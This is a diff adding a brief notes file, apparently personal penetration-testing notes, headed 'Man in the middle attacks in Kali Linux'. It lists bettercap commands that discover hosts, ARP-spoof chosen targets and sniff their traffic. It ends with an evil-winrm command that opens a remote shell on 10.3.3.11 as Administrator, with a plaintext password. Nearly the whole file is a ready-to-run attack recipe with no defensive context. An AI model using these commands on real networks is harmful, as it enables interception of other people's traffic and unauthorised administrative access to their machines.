@@ -1,0 +1,14 @@
+MAN IN THE MIDDLE ATTACKS IN KALI LINUX 
+
+USING BETTERCAP
+
+1. sudo apt install bettercap-ui
+2. sudo bettercap
+( Connect on the same network )		
+3. net.probe on  ( Search all the device on the network)
+4. net.show
+5. set arp.spoof.targets 0.0.0.0
+6. arp.spoof on
+7. net.sniff on
+
+evil-winrm -i 10.3.3.11 -u Administrator -p C1sc0123
